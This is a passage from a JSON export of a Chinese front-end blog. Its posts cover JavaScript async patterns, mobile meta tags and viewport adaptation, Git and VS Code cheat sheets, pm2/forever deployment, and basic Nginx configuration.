第二个请求的 url 地址为：/page/2?param=${res1.data}，依赖第一次请求的res1.data，返回结果为res2`。 第三次请求的 url地址为：/page/3?param=${res2.data}，依赖第二次请求的 res2.data，返回结果为 res3。 由于后续请求依赖前一个请求的结果，所以我们只能把下一次请求写到上一次请求的回调函数内部，这样就形成了常说的：回调地狱。 二、发布/订阅 我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern） 这个模式有多种实现，下面采用的是Ben Alman的Tiny Pub/Sub，这是jQuery的一个插件 首先，f2向”信号中心”jQuery订阅”done“信号 1jQuery.subscribe(\"done\", f2); f1进行如下改写 123456function f1()&#123; setTimeout(function () &#123; // f1的任务代码 jQuery.publish(\"done\"); &#125;, 1000);&#125; jQuery.publish(&quot;done&quot;)的意思是，f1执行完成后，向”信号中心&quot;jQuery发布&quot;done&quot;信号，从而引发f2的执行。 此外，f2完成执行后，也可以取消订阅（unsubscribe） 1jQuery.unsubscribe(\"done\", f2); 这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。 三、Promise Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大 所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理 简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。 现在我们使用 Promise 重新实现上面的案例，首先，我们要把异步请求数据的方法封装成 Promise 1234567891011function getDataAsync (url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; var res = &#123; url: url, data: Math.random() &#125; resolve(res) &#125;, 1000) &#125;)&#125; 那么请求的代码应该这样写 123456789101112getDataAsync('/page/1?param=123') .then(res1 =&gt; &#123; console.log(res1) return getDataAsync(`/page/2?param=$&#123;res1.data&#125;`) &#125;) .then(res2 =&gt; &#123; console.log(res2) return getDataAsync(`/page/3?param=$&#123;res2.data&#125;`) &#125;) .then(res3 =&gt; &#123; console.log(res3) &#125;) then 方法返回一个新的 Promise 对象，then 方法的链式调用避免了 CallBack 回调地狱 但也并不是完美，比如我们要添加很多 then 语句， 每一个 then 还是要写一个回调。 如果场景再复杂一点，比如后边的每一个请求依赖前面所有请求的结果，而不仅仅依赖上一次请求的结果，那会更复杂。 为了做的更好，async/await 就应运而生了，来看看使用 async/await 要如何实现 四、async/await await后面必须是一个Promise对象 getDataAsync 方法不变，如下 1234567891011 function getDataAsync (url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; var res = &#123; url: url, data: Math.random() &#125; resolve(res) &#125;, 1000) &#125;)&#125; 业务代码如下 12345678async function getData () &#123; var res1 = await getDataAsync('/page/1?param=123') console.log(res1) var res2 = await getDataAsync(`/page/2?param=$&#123;res1.data&#125;`) console.log(res2) var res3 = await getDataAsync(`/page/2?param=$&#123;res2.data&#125;`) console.log(res3)&#125; 可以看到使用async\\await就像写同步代码一样 对比 Promise 感觉怎么样？是不是非常清晰，但是 async/await 是基于 Promise 的，因为使用 async 修饰的方法最终返回一个 Promise， 实际上，async/await 可以看做是使用 Generator 函数处理异步的语法糖，我们来看看如何使用 Generator 函数处理异步 五、Generator 首先异步函数依然是 1234567891011function getDataAsync (url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; var res = &#123; url: url, data: Math.random() &#125; resolve(res) &#125;, 1000) &#125;)&#125; 使用 Generator 函数可以这样写 12345678function * getData () &#123; var res1 = yield getDataAsync('/page/1?param=123') console.log(res1) var res2 = yield getDataAsync(`/page/2?param=$&#123;res1.data&#125;`) console.log(res2) var res3 = yield getDataAsync(`/page/2?param=$&#123;res2.data&#125;`) console.log(res3))&#125; 然后我们这样逐步执行 12345678var g = getData()g.next().value.then(res1 =&gt; &#123; g.next(res1).value.then(res2 =&gt; &#123; g.next(res2).value.then(() =&gt; &#123; g.next() &#125;) &#125;)&#125;) 上面的代码，我们逐步调用遍历器的 next() 方法，由于每一个 next() 方法返回值的 value 属性为一个 Promise对象 所以我们为其添加 then 方法， 在 then 方法里面接着运行 next 方法挪移遍历器指针，直到 Generator 函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器 1234567891011121314function run (gen) &#123; var g = gen() function next (data) &#123; var res = g.next(data) if (res.done) return res.value res.value.then((data) =&gt; &#123; next(data) &#125;) &#125; next()&#125; run 方法用来自动运行异步的 Generator 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 Generator 函数了。 有了 run 方法，我们只需要这样运行 getData 方法 1run(getData) 这样，我们就可以把异步操作封装到 Generator 函数内部，使用 run 方法作为 Generator 函数的自执行器，来处理异步。其实我们不难发现， async/await 方法相比于 Generator 处理异步的方式，有很多相似的地方，只不过 async/await 在语义化方面更加明显，同时 async/await 不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 async/await 是 Generator 函数处理异步的语法糖了","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"异步回调","slug":"异步回调","permalink":"https://ru23.com/tags/异步回调/"}]},{"title":"移动端meta标签一览","slug":"2017-08-mobile-meta-summary","date":"2017-08-23T10:40:43.000Z","updated":"2018-10-24T03:46:02.137Z","comments":true,"path":"note/a2eb1a7.html","link":"","permalink":"https://ru23.com/note/a2eb1a7.html","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;!DOCTYPE html&gt; &lt;!-- 使用 HTML5 doctype，不区分大小写 --&gt;&lt;html lang=\"zh-cmn-Hans\"&gt; &lt;!-- 更加标准的 lang 属性写法 http://zhi.hu/XyIa --&gt;&lt;head&gt; &lt;!-- 声明文档使用的字符编码 --&gt; &lt;meta charset='utf-8'&gt; &lt;!-- 优先使用 IE 最新版本和 Chrome --&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"/&gt; &lt;!-- 页面描述 --&gt; &lt;meta name=\"description\" content=\"不超过150个字符\"/&gt; &lt;!-- 页面关键词 --&gt; &lt;meta name=\"keywords\" content=\"\"/&gt; &lt;!-- 网页作者 --&gt; &lt;meta name=\"author\" content=\"name, email@gmail.com\"/&gt; &lt;!-- 搜索引擎抓取 --&gt; &lt;meta name=\"robots\" content=\"index,follow\"/&gt; &lt;!-- 为移动设备添加 viewport --&gt; &lt;meta name=\"viewport\" content=\"initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no\"&gt; &lt;!-- `width=device-width` 会导致 iPhone 5 添加到主屏后以 WebApp 全屏模式打开页面时出现黑边 http://bigc.at/ios-webapp-viewport-meta.orz --&gt; &lt;!-- iOS 设备 begin --&gt; &lt;meta name=\"apple-mobile-web-app-title\" content=\"标题\"&gt; &lt;!-- 添加到主屏后的标题（iOS 6 新增） --&gt; &lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"/&gt; &lt;!-- 是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏 --&gt; &lt;meta name=\"apple-itunes-app\" content=\"app-id=myAppStoreID, affiliate-data=myAffiliateData, app-argument=myURL\"&gt; &lt;!-- 添加智能 App 广告条 Smart App Banner（iOS 6+ Safari） --&gt; &lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"/&gt; &lt;!-- 设置苹果工具栏颜色 --&gt; &lt;meta name=\"format-detection\" content=\"telphone=no, email=no\"/&gt; &lt;!-- 忽略页面中的数字识别为电话，忽略email识别 --&gt; &lt;!-- 启用360浏览器的极速模式(webkit) --&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;!-- 避免IE使用兼容模式 --&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;!-- 不让百度转码 --&gt; &lt;meta http-equiv=\"Cache-Control\" content=\"no-siteapp\" /&gt; &lt;!-- 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓 --&gt; &lt;meta name=\"HandheldFriendly\" content=\"true\"&gt; &lt;!-- 微软的老式浏览器 --&gt; &lt;meta name=\"MobileOptimized\" content=\"320\"&gt; &lt;!-- uc强制竖屏 --&gt; &lt;meta name=\"screen-orientation\" content=\"portrait\"&gt; &lt;!-- QQ强制竖屏 --&gt; &lt;meta name=\"x5-orientation\" content=\"portrait\"&gt; &lt;!-- UC强制全屏 --&gt; &lt;meta name=\"full-screen\" content=\"yes\"&gt; &lt;!-- QQ强制全屏 --&gt; &lt;meta name=\"x5-fullscreen\" content=\"true\"&gt; &lt;!-- UC应用模式 --&gt; &lt;meta name=\"browsermode\" content=\"application\"&gt; &lt;!-- QQ应用模式 --&gt; &lt;meta name=\"x5-page-mode\" content=\"app\"&gt; &lt;!-- windows phone 点击无高光 --&gt; &lt;meta name=\"msapplication-tap-highlight\" content=\"no\"&gt; &lt;!-- iOS 图标 begin --&gt; &lt;link rel=\"apple-touch-icon-precomposed\" href=\"/apple-touch-icon-57x57-precomposed.png\"/&gt; &lt;!-- iPhone 和 iTouch，默认 57x57 像素，必须有 --&gt; &lt;link rel=\"apple-touch-icon-precomposed\" sizes=\"114x114\" href=\"/apple-touch-icon-114x114-precomposed.png\"/&gt; &lt;!-- Retina iPhone 和 Retina iTouch，114x114 像素，可以没有，但推荐有 --&gt; &lt;link rel=\"apple-touch-icon-precomposed\" sizes=\"144x144\" href=\"/apple-touch-icon-144x144-precomposed.png\"/&gt; &lt;!-- Retina iPad，144x144 像素，可以没有，但推荐有 --&gt; &lt;!-- iOS 图标 end --&gt; &lt;!-- iOS 启动画面 begin --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"768x1004\" href=\"/splash-screen-768x1004.png\"/&gt; &lt;!-- iPad 竖屏 768 x 1004（标准分辨率） --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"1536x2008\" href=\"/splash-screen-1536x2008.png\"/&gt; &lt;!-- iPad 竖屏 1536x2008（Retina） --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"1024x748\" href=\"/Default-Portrait-1024x748.png\"/&gt; &lt;!-- iPad 横屏 1024x748（标准分辨率） --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"2048x1496\" href=\"/splash-screen-2048x1496.png\"/&gt; &lt;!-- iPad 横屏 2048x1496（Retina） --&gt; &lt;link rel=\"apple-touch-startup-image\" href=\"/splash-screen-320x480.png\"/&gt; &lt;!-- iPhone/iPod Touch 竖屏 320x480 (标准分辨率) --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"640x960\" href=\"/splash-screen-640x960.png\"/&gt; &lt;!-- iPhone/iPod Touch 竖屏 640x960 (Retina) --&gt; &lt;link rel=\"apple-touch-startup-image\" sizes=\"640x1136\" href=\"/splash-screen-640x1136.png\"/&gt; &lt;!-- iPhone 5/iPod Touch 5 竖屏 640x1136 (Retina) --&gt; &lt;!-- iOS 启动画面 end --&gt; &lt;!-- iOS 设备 end --&gt; &lt;meta name=\"msapplication-TileColor\" content=\"#000\"/&gt; &lt;!-- Windows 8 磁贴颜色 --&gt; &lt;meta name=\"msapplication-TileImage\" content=\"icon.png\"/&gt; &lt;!-- Windows 8 磁贴图标 --&gt; &lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"RSS\" href=\"/rss.xml\"/&gt; &lt;!-- 添加 RSS 订阅 --&gt; &lt;link rel=\"shortcut icon\" type=\"image/ico\" href=\"/favicon.ico\"/&gt; &lt;!-- 添加 favicon icon --&gt; &lt;!-- sns 社交标签 begin --&gt; &lt;!-- 参考微博API --&gt; &lt;meta property=\"og:type\" content=\"类型\" /&gt; &lt;meta property=\"og:url\" content=\"URL地址\" /&gt; &lt;meta property=\"og:title\" content=\"标题\" /&gt; &lt;meta property=\"og:image\" content=\"图片\" /&gt; &lt;meta property=\"og:description\" content=\"描述\" /&gt; &lt;!-- sns 社交标签 end --&gt; &lt;title&gt;标题&lt;/title&gt; &lt;/head&gt;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"移动端","slug":"移动端","permalink":"https://ru23.com/tags/移动端/"}]},{"title":"ES6笔记记录","slug":"2017-08-es6-note-record","date":"2017-08-20T06:33:00.000Z","updated":"2018-10-24T03:46:02.134Z","comments":true,"path":"note/957a3ac4.html","link":"","permalink":"https://ru23.com/note/957a3ac4.html","excerpt":"","text":"","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"ES6","slug":"ES6","permalink":"https://ru23.com/tags/ES6/"}]},{"title":"Git笔记总结篇","slug":"2017-07-git-notes","date":"2017-07-29T13:30:24.000Z","updated":"2018-10-24T03:46:02.132Z","comments":true,"path":"note/6c7ee97f.html","link":"","permalink":"https://ru23.com/note/6c7ee97f.html","excerpt":"","text":"声明：资料来源互联网 安装 在 Windows 上安装 Git 同样轻松，有个叫做 msysGit 的项目提供了安装包： 1http://msysgit.github.io/ 完成安装之后，就可以使用命令行的 git 工具（已经自带了 ssh 客户端）了，另外还有一个图形界面的 Git 项目管理工具。 配置 首先是配置帐号信息 12345git config -e [--global] # 编辑Git配置文件git config --global user.name yanhaijinggit config --global user.email yanhaijing@yeah.netgit config --list #查看配置的信息git help config #获取帮助信息 配置自动换行（自动转换坑太大） 1git config --global core.autocrlf input #提交到git是自动将换行符转换为lf 配置密钥 1ssh-keygen -t rsa -C yanhaijing@yeah.net #生成密钥 1ssh -T git@github.com #测试是否成功 配置别名，git的命令没有自动完成功能，有点坑哈，别名派上了用场 1234git config --global alias.st status #git stgit config --global alias.co checkout #git cogit config --global alias.br branch #git brgit config --global alias.ci commit #git ci 新建仓库 123456git init #初始化git status #获取状态git add [file1] [file2] ... #.或*代表全部添加git commit -m &quot;message&quot; #此处注意乱码git remote add origin git@github.com:yanhaijing/test.git #添加源git push -u origin master #push同事设置默认跟踪分支 从现有仓库克隆 12git clone git://github.com/yanhaijing/data.js.git git clone git://github.com/schacon/grit.git mypro#克隆到自定义文件夹 本地 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455git add * # 跟踪新文件git add -u [path] # 添加[指定路径下]已跟踪文件rm *&amp;git rm * # 移除文件git rm -f * # 移除文件git rm --cached * # 停止追踪指定文件，但该文件会保留在工作区git mv file_from file_to # 重命名跟踪文件git log # 查看提交记录git commit # 提交更新 git commit [file1] [file2] ... # 提交指定文件 git commit -m &apos;message&apos;git commit -a # 跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交git commit --amend#修改最后一次提交git commit -v # 提交时显示所有diff信息git reset HEAD *#取消已经暂存的文件git reset --mixed HEAD *#同上git reset --soft HEAD *#重置到指定状态，不会修改索引区和工作树git reset --hard HEAD *#重置到指定状态，会修改索引区和工作树git reset -- files#重置index区文件git revert HEAD #撤销前一次操作git revert HEAD~ #撤销前前一次操作git revert commit ## 撤销指定操作git checkout -- file#取消对文件的修改（从暂存区——覆盖worktree file）git checkout branch|tag|commit -- file_name#从仓库取出file覆盖当前分支git checkout -- .#从暂存区取出文件覆盖工作区git diff file #查看指定文件的差异git diff --stat #查看简单的diff结果git diff #比较Worktree和Index之间的差异git diff --cached #比较Index和HEAD之间的差异git diff HEAD #比较Worktree和HEAD之间的差异git diff branch #比较Worktree和branch之间的差异git diff branch1 branch2 #比较两次分支之间的差异git diff commit commit #比较两次提交之间的差异git log #查看最近的提交日志git log --pretty=oneline #单行显示提交日志git log --graph # 图形化显示git log --abbrev-commit # 显示log id的缩写git log -num #显示第几条log（倒数）git log --stat # 显示commit历史，以及每次commit发生变更的文件git log --follow [file] # 显示某个文件的版本历史，包括文件改名git log -p [file] # 显示指定文件相关的每一次diffgit stash #将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。git stash list #查看保存的工作现场git stash apply #恢复工作现场git stash drop #删除stash内容git stash pop #恢复的同时直接删除stash内容git stash apply stash@&#123;0&#125; #恢复指定的工作现场，当你保存了不只一份工作现场时。 分支 123456789101112131415161718192021222324252627282930git branch#列出本地分支git branch -r#列出远端分支git branch -a#列出所有分支git branch -v#查看各个分支最后一个提交对象的信息git branch --merge#查看已经合并到当前分支的分支git branch --no-merge#查看为合并到当前分支的分支git branch test#新建test分支git branch branch [branch|commit|tag] # 从指定位置出新建分支git branch --track branch remote-branch # 新建一个分支，与指定的远程分支建立追踪关系git branch -m old new #重命名分支git branch -d test#删除test分支git branch -D test#强制删除test分支git branch --set-upstream dev origin/dev #将本地dev分支与远程dev分支之间建立链接git checkout test#切换到test分支git checkout -b test#新建+切换到test分支git checkout -b test dev#基于dev新建test分支，并切换git merge test#将test分支合并到当前分支git merge --squash test ## 合并压缩，将test上的commit压缩为一条git cherry-pick commit #拣选合并，将commit合并到当前分支git cherry-pick -n commit #拣选多个提交，合并完后可以继续拣选下一个提交git rebase master#将master分之上超前的提交，变基到当前分支git rebase --onto master 169a6 #限制回滚范围，rebase当前分支从169a6以后的提交git rebase --interactive #交互模式 git rebase --continue# 处理完冲突继续合并 git rebase --skip# 跳过 git rebase --abort# 取消合并 远端 123456789101112git fetch origin remotebranch[:localbranch]# 从远端拉去分支[到本地指定分支]git merge origin/branch#合并远端上指定分支git pull origin remotebranch:localbranch# 拉去远端分支到本地分支git push origin branch#将当前分支，推送到远端上指定分支git push origin localbranch:remotebranch#推送本地指定分支，到远端上指定分支git push origin :remotebranch # 删除远端指定分支git push origin remotebranch --delete # 删除远程分支git branch -dr branch # 删除本地和远程分支git checkout -b [--track] test origin/dev#基于远端dev分支，新建本地test分支[同时设置跟踪] 源 git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。 个人开发时，多源用的可能不多，但多源其实非常有用。 12345678910git remote add origin1 git@github.com:yanhaijing/data.js.gitgit remote#显示全部源git remote -v#显示全部源+详细信息git remote rename origin1 origin2#重命名git remote rm origin#删除git remote show origin#查看指定源的全部信息 标签 当开发到一定阶段时，给程序打标签是非常棒的功能。 123456789101112git tag#列出现有标签 git tag v0.1 [branch|commit] # [从指定位置]新建标签git tag -a v0.1 -m &apos;my version 1.4&apos;#新建带注释标签git checkout tagname#切换到标签git push origin v1.5#推送分支到源上git push origin --tags#一次性推送所有分支git tag -d v0.1#删除标签git push origin :refs/tags/v0.1#删除远程标签","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://ru23.com/tags/Git/"}]},{"title":"Visual Studio Code 常用快捷键","slug":"2017-03-vs-keyboard-shortcuts","date":"2017-07-23T11:40:03.000Z","updated":"2018-10-24T03:46:02.087Z","comments":true,"path":"note/cc661528.html","link":"","permalink":"https://ru23.com/note/cc661528.html","excerpt":"","text":"主命令框 F1 或 Ctrl+Shift+P: 打开命令面板。在打开的输入框内，可以输入任何命令 按一下 Backspace会进入到 Ctrl+P模式在 Ctrl+P 下输入 &gt; 可以进入 Ctrl+Shift+P 模式 在 Ctrl+P 窗口下还可以 直接输入文件名，跳转到文件 ? 列出当前可执行的动作 ! 显示 Errors或 Warnings，也可以 Ctrl+Shift+M : 跳转到行数，也可以 Ctrl+G 直接进入 @ 跳转到 symbol（搜索变量或者函数），也可以 Ctrl+Shift+O直接进入 @ 根据分类跳转 - symbol，查找属性或函数，也可以 Ctrl+Shift+O后输入:进入 #根据名字查找 symbol，也可以 Ctrl+T 编辑器与窗口管理 打开一个新窗口： Ctrl+Shift+N 关闭窗口： Ctrl+Shift+W 新建文件 Ctrl+N 文件之间切换 Ctrl+Tab 代码编辑格式调整 代码行缩进 Ctrl+[ 、 Ctrl+] Ctrl+C、 Ctrl+V 复制或剪切当前行/当前选中内容 代码格式化： Ctrl+Shift+P 后输入 format code 上下移动一行：Alt+Up或 Alt+Down 向上向下复制一行： Shift+Alt+Up或 Shift+Alt+Down 在当前行下边插入一行 Ctrl+Enter 在当前行上方插入一行 Ctrl+Shift+Enter 光标相关 移动到行首： Home 移动到行尾： End 移动到文件结尾： Ctrl+End 移动到文件开头： Ctrl+Home 移动到定义处： F12 多行编辑(列编辑)：Alt+Shift+鼠标左键 同时选中所有匹配： Ctrl+Shift+L 重构代码 找到所有的引用： Shift+F12 同时修改本文件中所有匹配的： Ctrl+F12 重命名：比如要修改一个方法名，可以选中后按 F2，输入新的名字，回车，会发现所有的文件都修改了 跳转到下一个 Error 或 Warning：当有多个错误时可以按 F8 逐个跳转 查找替换 查找 Ctrl+F 查找替换 Ctrl+H 整个文件夹中查找 Ctrl+Shift+F 显示相关 全屏：F11 侧边栏显/隐：Ctrl+B 显示资源管理器 Ctrl+Shift+E 显示搜索 Ctrl+Shift+F 显示 Debug Ctrl+Shift+D","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"VS","slug":"VS","permalink":"https://ru23.com/tags/VS/"}]},{"title":"移动端适配","slug":"2017-05-mobile-adaptation","date":"2017-05-23T13:35:08.000Z","updated":"2018-10-24T03:46:02.128Z","comments":true,"path":"note/783ce8a9.html","link":"","permalink":"https://ru23.com/note/783ce8a9.html","excerpt":"","text":"物理像素:移动端设备的分辨率 独立像素:css的像素 320 375 像素比 = 物理像素/独立像素 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;&gt; width=device-width 设备宽度 640px(低版本的安卓手机不支持数字) 这个属性在不支持IE initial-scale=1.0(初始缩放比),能够起到和width=device-width相同的效果(把理想的视窗设置为设备的宽度) 两个配合使用就能够很好的解决移动端各设备的适配问题 maximum-scale=1.0最大缩放比例 user-scalable=0禁止缩放 minimum-scale=1.0 最小缩放比例 移动端布局方法 1、流式布局 与设备等宽 做自适应 100%或者具体的像素值 2、rem做盒子的宽度，viewport缩放 3、固定宽度 viewport缩放 content=&quot;width=640, initial-scale=0.5, maximum-scale=0.5, user-scalable=0&quot;（用的比较少） 4、vw/vh 相对于viewport理想视窗(设备)的比例(兼容性不好) 1vw = 10%设备宽 10vw meta标签属性设置 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge chrome=1&quot;&gt; IE8浏览器的显示方式:IE=edge以IE`最高版本显示 chrome=1 以谷歌浏览器模式渲染(GCF(Google Chrome Frame)) 1&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; referrer 告诉浏览器链接来源于哪里(计算网页上链接的访问量) 1&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no,email=no,adress=no&quot;&gt; 格式检测:（数字、邮箱、地址） no不识别为电话号码、邮箱、地址 1&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt; 删除默认的苹果工具栏、菜单栏(全屏显示) 1&lt;meta name=&quot;apple-touch-fullscreen&quot; =&quot;yes&quot;&gt; 全屏显示 1&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt; 设置app应用下状态条的颜色 默认值default (白色) black（黑色） black-translucent（灰色半透明）若果设置为这个值会占据页面的px位置浮在页面上方20px高度 iphone4是40px 1&lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt; 360模式固定为极速模式 常见的meta属性 1234&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0，minimum-scale=1.0&quot;&gt; link 扩展 1&lt;link rel=&quot;dns-prefetch&quot; href=&quot;xxx.com&quot;&gt; 预解析技术，当浏览网页时，浏览器会在加载页面的时对页面中的域名进行解析缓存，当我们点击这些网页的链接时就不需要再进行DNS的解析，减少用户的等待时间，提高用户的体验度 rem 根目录 html 的font-size尺寸默认为16px 1rem = 16px; 1rem = html的font-size的尺寸大小 参考学习资料 https://h5.m.taobao.com/#index 手机淘宝 rem http://m.jd.com/ 手机京东 100% http://m.lizhi.fm/ 荔枝 640视窗 http://jx.tmall.com/ 天猫 100% http://3g.163.com/touch/all?nav=1&amp;version=v_standard 网易 rem http://www.cnblogs.com/2050/p/3877280.html viewport 解析 http://ymblog.net/2015/07/01/%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AFmeta%E6%A0%87%E7%AD%BE%E8%BD%AC/ meta解析 http://ljinkai.github.io/2015/06/06/mobile-web-skill/ 移动端布局注意技巧","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"移动端","slug":"移动端","permalink":"https://ru23.com/tags/移动端/"}]},{"title":"forever and pm2部署nodejs项目","slug":"2017-05-forever-pm2","date":"2017-05-09T14:50:08.000Z","updated":"2018-10-24T03:46:02.126Z","comments":true,"path":"note/d03e9032.html","link":"","permalink":"https://ru23.com/note/d03e9032.html","excerpt":"","text":"一、forever forever则可以在cmd或ssh连接断开时,让项目一直运行,而且可以在项目崩溃时自动重启 安装 npm install -g forever forever的帮助手册 forever --help 使用forever启动项目 forever start app.js 使用forever停止项目 forever stop app.js 列出所有通过forever管理的项目 forever list 监视项目中的文件,当文件有变动时重启项目 forever -w start app.js 二、pm2 安装pm2 npm install -g pm2 运行pm2 start app.js 查看运行状态 pm2 list 追踪资源运行情况 pm2 monit 查看日志 pm2 logs 重启应用 pm2 restart appId 停止应用 pm2 stop app.js 开启api访问 pm2 web 预定义运行配置文件 我们可以预定义一个配置文件，然后制定运行这个配置文件，比如我们定义一个文件process.json，内容如下 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;ANodeBlog&quot;, &quot;script&quot;: &quot;bin/www&quot;, &quot;watch&quot;: &quot;../&quot;, &quot;log_date_format&quot;: &quot;YYYY-MM-DD HH:mm Z&quot; &#125; ]&#125; 然后pm2 start process.json pm2与forever对比 Feature Forever PM2 Keep Alive ✔ ✔ Coffeescript ✔ Log aggregation ✔ API ✔ Terminal monitoring ✔ Clustering ✔ JSON configuration ✔","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://ru23.com/tags/Node/"},{"name":"部署","slug":"部署","permalink":"https://ru23.com/tags/部署/"}]},{"title":"Nginx基础配置篇","slug":"2017-05-nginx","date":"2017-05-08T14:35:08.000Z","updated":"2018-10-24T03:46:02.130Z","comments":true,"path":"note/a404b8b6.html","link":"","permalink":"https://ru23.com/note/a404b8b6.html","excerpt":"","text":"Nginx的启动、停止与重启 建立软连接Nginx到/usr/bin目录下 ln -s /usr/sbin/nginx /usr/bin 启动 启动代码格式：nginx安装目录地址 -c nginx配置文件地址 1[root@LinuxServer sbin]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 停止 nginx的停止有三种方式 从容停止 查看进程号 ps -ef|grep nginx 杀死进程 kill -QUIT 2072 快速停止 查看进程号 ps -ef|grep nginx 杀死进程 kill -TERM 2132 kill -INT 2132 强制停止 pkill -9 nginx 重启 验证nginx配置文件是否正确 方法一：进入nginx安装目录sbin下，输入命令./nginx -t看到如下显示nginx.conf syntax is ok nginx.conf test is successful说明配置文件正确 方法二：在启动命令-c前加-t 重启Nginx服务 方法一：进入nginx可执行目录sbin下，输入命令./nginx -s reload即可 方法二：查找当前nginx进程号，然后输入命令：kill -HUP 进程号 实现重启nginx服务 Nginx基础配置 在Nginx目录下的vhost或conf.d目录下新建一个配置文件（如poetries-80.conf） 把server的内容配置进去 在Nginx.conf中的http下include配置文件 检测配置文件是否出错 切换到/etc/nginx下 nginx -t 重新加载配置文件 nginx -c /usr/local/etc/nginx/nginx.conf 在重启Nginx nginx -s reload 1234567891011121314151617181920212223242526272829303132333435363738394041user root; //Nginx需要有有一个用户worker_processes 2; // Nginx进程数 最大1024pid conf/nginx.pid; worker_rlimit_nofile 2048;events &#123; use epoll; worker_connections 2048;&#125;http &#123; server &#123; listen 80; server_name 119.29.145.252; location / &#123; root /usr/local/nginx/html; index index.html index.htm; &#125; &#125; server &#123; listen 3001; server_name 119.29.145.252; location / &#123; root /usr/local/nginx/book; index index.html index.htm; &#125; &#125; server &#123; listen 9000; server_name 119.29.145.252; location / &#123; root /usr/local/nginx/vue; index index.html index.htm; &#125; &#125;&#125; 一些错误1nginx: [error] invalid PID number “” in “/usr/local/var/run/nginx/nginx.pid” 解决办法：nginx -c /usr/local/etc/nginx/nginx.conf nginx -s reload 权限问题导致Nginx 403 Forbidden错误的解决方法 在nginx.conf头部加入一行 user root; 